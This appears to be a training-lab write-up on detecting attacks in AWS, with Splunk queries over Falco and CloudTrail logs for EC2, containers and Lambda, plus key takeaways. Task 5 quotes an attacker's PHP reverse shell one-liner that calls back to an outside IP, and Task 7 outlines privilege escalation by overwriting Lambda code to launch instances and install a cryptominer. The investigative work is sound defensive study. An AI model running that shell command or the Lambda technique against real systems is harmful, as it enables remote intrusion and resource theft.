# Monitoring AWS Workloads

Learn how apps run in AWS and what you should know to effectively monitor them.

## Task 1 - Introduction

Introductory task covering the room's learning objectives: EC2/SSM monitoring, Falco for runtime detection, container visibility, AWS Lambda security, and how Lambda can be abused for persistence and privilege escalation. Started the lab machine.

No answer required.

## Task 2 - EC2 and AWS Services

Conceptual task on AWS Systems Manager (SSM), Session Manager, and EC2 Auto Scaling.

**Which CloudTrail events can you use to track SSM commands and sessions?**

```
SendCommand, StartSession
```

**Which AWS service adjusts the right number of EC2 instances to match demand?**

```
Amazon EC2 Auto Scaling
```

## Task 3 - Falco for EC2

Investigated low-level Falco events from `ec2-demo` and a high-level alert from `srv-prodgw`, using the `task3` Splunk index.

```
index=task3 hostname=ec2-demo *passwd*
```

**When was Morgan Blake's local password changed?**

```
2026-01-14 23:44:19
```

![Raw Falco event showing passwd morgan.blake command](./Screen%20Shot%202026-08-09%20at%209.20.02%20PM.png)

```
index=task3 hostname=ec2-demo *git*clone*
```

**What GitHub repository name did Morgan clone to the VM?**

```
react-boilerplate
```

![proc.pcmdline field showing git clone react-boilerplate](./Screen%20Shot%202026-08-09%20at%209.21.16%20PM.png)

```
index=task3 hostname=srv-prodgw
```

**Now switch to the high-level alerts coming from srv-prodgw. What rule has triggered the alert you see?**

```
Search Private Keys or Passwords
```

![rule field showing Search Private Keys or Passwords](./Screen%20Shot%202026-08-09%20at%209.22.11%20PM.png)

![Task 3 answer confirmation](./Screen%20Shot%202026-08-09%20at%209.22.59%20PM.png)

## Task 4 - Intro to Containers

Conceptual task on container visibility and shared Initial Access risk between EC2 hosts and containers.

**Does an EC2 instance have access to the events of its containers?**

```
Yea
```

**Is Initial Access to containers similar to that of plain EC2?**

```
Yea
```

![Task 4 answer confirmation](./Screen%20Shot%202026-08-09%20at%209.23.29%20PM.png)

## Task 5 - Falco for Containers

Investigated a container breach through a vulnerable web app using the `task5` Splunk index.

```
index=task5
| stats count by output_fields.container.name
```

**Which two containers are visible in Falco logs?**

```
thm-db, thm-web
```

![container.name breakdown: host, thm-db, thm-web](./Screen%20Shot%202026-08-09%20at%209.25.02%20PM.png)

```
index=task5 output_fields.container.name=thm-web
| stats count by output_fields.container.image
```

**What container image does the web container use?**

```
thm/website:latest
```

![container.image field showing thm/website:latest](./Screen%20Shot%202026-08-09%20at%209.26.06%20PM.png)

```
index=task5 output_fields.container.name=thm-web (*apache* OR *httpd*)
```

Investigating the container's process activity surfaced a shell spawned by Apache, with the parent process exepath revealing the Apache binary location.

![proc.exepath field showing /bin/dash, 4 events](./Screen%20Shot%202026-08-09%20at%209.28.34%20PM.png)

**What is the absolute path to the Apache web server?**

```
/usr/sbin/apache2
```

The same event also revealed the attacker's reverse shell command, launched via a PHP one-liner spawned from Apache.

![Full expanded event: reverse shell via php fsockopen](./Screen%20Shot%202026-08-09%20at%209.32.44%20PM.png)

```
index=task5 output_fields.container.name=thm-web output_fields.proc.pexepath="/usr/sbin/apache2"
| sort _time
| table _time output_fields.proc.cmdline
```

Sorting all commands spawned from Apache chronologically showed the attacker's full sequence: an initial ping test, then a `whoami` discovery command, then `which php` to check for PHP availability, then finally the reverse shell.

![Chronological command sequence: ping, whoami, which php, reverse shell](./Screen%20Shot%202026-08-09%20at%209.34.47%20PM.png)

**What was the first Discovery command executed through the web?**

```
whoami
```

**What command line allowed the attacker to open a reverse shell?**

```
php -r '$sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");'
```

![Task 5 answer confirmation](./Screen%20Shot%202026-08-09%20at%209.34.55%20PM.png)

## Task 6 - AWS Lambda Theory

Explored Lambda events coming from the `img-processor` function using the `task6` Splunk index.

![Initial index=task6 search showing raw CloudTrail Lambda events](./Screen%20Shot%202026-08-09%20at%209.44.54%20PM.png)

![Expanded event detail showing eventTime, eventType, and account fields](./Screen%20Shot%202026-08-09%20at%209.44.13%20PM.png)

```
index=task6 eventName=CreateFunction20150331 requestParameters.functionName=img-processor
```

![requestParameters.role field showing arn for img-processor-role-ztpjz457, 5 events](./Screen%20Shot%202026-08-09%20at%209.48.10%20PM.png)

**What role was assigned to the function during its creation?**

```
img-processor-role-ztpjz457
```

```
index=task6 eventName=UpdateFunctionCode20150331v2
```

![Raw event showing UpdateFunctionCode20150331v2 with codeSha256 value](./Screen%20Shot%202026-08-09%20at%209.51.20%20PM.png)

**What is the function's codeSha256 after the change in its code?**

```
JM6U2MB9wb7p738MMZzcISed6lXCRm0GNHS0eK0UpZQ=
```

```
index=task6 eventName=UpdateFunctionConfiguration20150331v2
```

![requestParameters.role field showing ImageProcessorRole ARN](./Screen%20Shot%202026-08-09%20at%209.52.35%20PM.png)

**Soon after, the role of the function has been changed. What is the name of the new execution role?**

```
ImageProcessorRole
```

```
index=task6 eventName=AddPermission20150331v2
```

**Lastly, the function has been made publicly accessible. What CloudTrail event confirms this misconfiguration?**

```
AddPermission20150331v2
```

![Task 6 answer confirmation](./Screen%20Shot%202026-08-09%20at%209.52.51%20PM.png)

## Task 7 - Lambda for Persistence / Privesc

Investigated a scenario where a low-privileged developer's IAM user was compromised and used to escalate privileges through a high-privileged Lambda function, using the `task7` Splunk index.

```
index=task7 eventSource=lambda.amazonaws.com
| table _time userIdentity.userName userIdentity.accessKeyId eventName
| sort _time
```

![Table of Lambda events showing carl.brown's access key and event names in chronological order](./Screen%20Shot%202026-08-09%20at%209.54.26%20PM.png)

**What user and access key interacted with the Lambda service?**

```
carl.brown, AKIAVZZK4G6EZH7GIZY3
```

```
index=task7 eventName=UpdateFunctionCode20150331v2 userIdentity.userName=carl.brown
| table _time responseElements.codeSize
```

The first code update (the one that launched EC2 instances) was 1837 bytes; a second update later in the timeline (1845 bytes) installed the SSM-based cryptominer.

![codeSize field stats showing 1837 and 1845 byte values](./Screen%20Shot%202026-08-09%20at%209.55.21%20PM.png)

**The attacker overwrote the Lambda code with the malicious one. What is the size of the uploaded Python code?**

```
1837
```

```
index=task7 eventName=RunInstances
```

![responseElements.instancesSet.items{}.instanceId field showing both instance IDs](./Screen%20Shot%202026-08-09%20at%209.58.43%20PM.png)

**The malicious code started two EC2 instances. What are their instance IDs?**

```
i-054e705408f5fa5de, i-056219235e66e3f94
```

```
index=task7 eventSource=ssm.amazonaws.com eventName=SendCommand
```

![requestParameters.documentName field showing AWS-RunShellScript](./Screen%20Shot%202026-08-09%20at%209.59.56%20PM.png)

**The code was updated again to install cryptominers on EC2 via SSM. What SSM "documentName" did the attacker use to install malware?**

```
AWS-RunShellScript
```

```
index=task7 eventSource=ec2.amazonaws.com userIdentity.type=AssumedRole
| table _time userAgent
```

![userAgent field showing the Boto3/1.40.4 user-agent string](./Screen%20Shot%202026-08-09%20at%2010.00.40%20PM.png)

**Which user-agent was used by Lambda to run the malicious code?**

```
Boto3/1.40.4
```

![Task 7 answer confirmation](./Screen%20Shot%202026-08-09%20at%2010.00.55%20PM.png)

## Key Takeaways

- AWS Systems Manager (SSM) and Session Manager both provide agent-based EC2 access that bypasses traditional SSH/RDP logging. SendCommand and StartSession are the key CloudTrail events for tracking this activity, and in the wrong hands, SSM can function as a fully capable Command and Control channel across every instance with the agent installed.
- Auto Scaling introduces real monitoring gaps: short-lived instances make EDR/SIEM agent deployment impractical, asset inventory becomes unreliable, and DFIR evidence can be lost the moment an instance terminates during a downscale event. Despite the lower priority, autoscaled workloads are still worth protecting since an attacker can simply re-exploit the same vulnerability on the next spun-up instance.
- Falco is a stronger fit than Auditd for cloud and containerized workloads because it enriches every event with container context (name, image, ID) and supports both raw low-level event logging and high-level, SIEM-style detection rules, which drastically reduces both noise and resource overhead on lightweight instances.
- Containers are sandboxed from each other and the host by default, but the host VM always has full visibility into every container's processes. This means host-level monitoring agents remain the correct place to gain complete process, file, and network visibility across all containers running on that host.
- Initial Access risk is conceptually the same whether targeting a host or a container: exposed remote access or management interfaces, vulnerable web/database applications, and supply chain attacks via dependencies. The difference lies in blast radius. Compromising the host risks every container on it, while compromising a single container is contained unless the attacker escapes to the host or another container.
- Lambda functions are a common Initial Access, Persistence, Privilege Escalation, and Impact vector because a function's real capability is the combination of its code and its execution role. A low-privileged user who can only edit Lambda code (not IAM policies directly) can still inherit the function's full execution role permissions by simply overwriting that code, exactly as demonstrated by the Lambda-for-Privesc scenario in this room.
- The versioned Lambda CloudTrail event names (e.g., CreateFunction20150331, UpdateFunctionCode20150331v2) don't follow a single consistent suffix pattern across event types, so when a query returns zero results, checking the actual eventName values in the index (rather than assuming the suffix) is a fast way to confirm the correct event name.
